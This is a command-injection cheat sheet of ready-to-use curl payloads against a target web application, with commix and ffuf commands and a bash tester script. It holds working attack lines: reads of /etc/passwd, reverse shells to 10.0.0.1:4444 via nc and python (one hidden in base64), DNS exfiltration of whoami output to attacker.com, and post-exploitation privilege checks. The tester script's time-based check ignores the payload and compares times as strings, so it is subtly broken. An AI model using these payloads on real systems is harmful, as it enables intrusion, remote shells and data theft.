#### 1. BASIC MANUAL TESTS
# Classic Unix injection
curl "http://target.com/ping?ip=127.0.0.1;id"
curl "http://target.com/submit?email=user@test.com|whoami"

# Windows command injection
curl "http://target.com/run?cmd=ping+127.0.0.1&whoami"

# Blind detection with time delays
curl "http://target.com/diagnose?host=127.0.0.1+%26%26+sleep+5"

#### 2. AUTOMATED TOOLS
# Commix (Automated exploitation)
commix -u "http://target.com/ping.php?ip=INJECT_HERE"
commix -r request.txt --os-cmd="nc -e /bin/sh 10.0.0.1 4444"

# Burp Suite Intruder
# Use "Fuzzing - command injection" wordlist with grep matching on "root" or "www-data"

# Ffuf for blind detection
ffuf -u "http://target.com/api?cmd=FUZZ" -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -mr "command executed"

#### 3. ADVANCED INJECTION TECHNIQUES
# Chained commands
curl "http://target.com/backup?dir=/tmp;touch+/tmp/pwned;"

# Environment variable pollution
curl "http://target.com/debug?input=$PATH"

# Argument injection
curl "http://target.com/convert?file=input.jpg;--version"

# Nested substitution
curl "http://target.com/query?search=\`whoami\`"

#### 4. BYPASS TECHNIQUES
# Character escaping
curl "http://target.com/ping?ip=127.0.0.1%0Acat%20/etc/passwd"

# Encoding tricks
curl "http://target.com/run?cmd=127.0.0.1%26%26%20id"
curl "http://target.com/query?input=%24%28echo%20bmM%20LWUgL2Jpbi9zaCAxMC4wLjAuMSA0NDQ0%20%7C%20base64%20-d%29"

# Wildcard expansion
curl "http://target.com/clean?dir=/tmp/*;cat+/etc/passwd"

#### 5. OPERATING SYSTEM SPECIFICS
# Linux special chars
; & | ` $() > < # { } 

# Windows special chars
%0A %0D & | && || ^ > < 

# PowerShell injection
curl "http://target.com/ps?script=Start-Process calc.exe"

#### 6. BLIND DETECTION METHODS
# Time-based detection
time curl -s "http://target.com/ping?ip=127.0.0.1 && sleep 5" > /dev/null

# DNS exfiltration
curl "http://target.com/run?cmd=ping+-c+1+\`whoami\`.attacker.com"

# Out-of-band (OAST)
curl "http://target.com/debug?input=$(curl http://attacker.com)"

#### 7. POST-EXPLOITATION
# Reverse shells
curl "http://target.com/admin?cmd=nc+-e+/bin/bash+10.0.0.1+4444"
curl "http://target.com/run?script=python3+-c+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

# Privilege escalation
curl "http://target.com/clean?dir=/tmp;sudo+-l"

#### PRO TIPS:
# 1. Always test:
#  - All input parameters (GET/POST/Headers)
#  - Different command separators (; & | etc.)
#  - Time-based blind payloads
#  - Out-of-band detection

# 2. Critical contexts:
#  - System administration interfaces
#  - File upload/processing features
#  - Network diagnostic tools
#  - API endpoints calling system commands

# 3. Escalation paths:
#  - Check sudo permissions
#  - Look for SUID binaries
#  - Examine cron jobs
#  - Check for writable system directories

# #### RECOMMENDED WORDLISTS:
#  - /usr/share/seclists/Fuzzing/command-injection-commix.txt
#  - /usr/share/seclists/Fuzzing/special-chars.txt
#  - /usr/share/seclists/Fuzzing/command-injection-generic.txt

### **Key Features:**
# 1. **Comprehensive Testing** - Covers all command injection variants
# 2. **OS-Specific Payloads** - Separate techniques for Linux/Windows
# 3. **Blind Detection** - Methods for identifying blind injections
# 4. **Post-Exploitation** - Reverse shells and privilege escalation
# 5. **Ready-to-Use Script** - Automated testing template


#### SAMPLE DETECTION SCRIPT:
```bash
#!/bin/bash
# cmd_injection_tester.sh
URL=$1
PARAM=$2

declare -a PAYLOADS=(
    ";id"
    "|whoami"
    "`hostname`"
    "$(sleep 5)"
    "|| ping -c 1 attacker.com"
    "%0Acat%20/etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
    echo -n "Testing $payload: "
    response=$(curl -s "$URL?$PARAM=$payload")
    if echo "$response" | grep -qE "(root|www-data|uid=)"; then
        echo "VULNERABLE!"
    elif [[ $(curl -s -o /dev/null -w "%{time_total}" "$URL?$PARAM=sleep+5") > 4 ]]; then
        echo "Blind injection possible (time-based)"
    else
        echo "filtered"
    fi
done
```

